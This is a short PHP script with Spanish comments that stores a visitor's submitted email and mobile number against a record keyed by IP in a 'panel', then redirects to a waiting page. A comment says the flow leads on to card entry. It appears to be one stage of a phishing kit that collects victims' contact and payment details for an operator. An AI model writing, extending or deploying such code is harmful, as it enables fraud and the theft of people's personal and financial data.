<?php
require('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];
$reg = traer_regitro($ip);
$email = $_POST['email'] ?? '';
$celular = $_POST['celular'] ?? '';

// Usamos la función que ya tienes en tu funciones.php original
actualizar_registro_info($reg, $email, $celular);

// Después de info, lo mandamos a esperar o directamente a tarjeta
header("Location: ../simulate/espera.php"); 
exit();
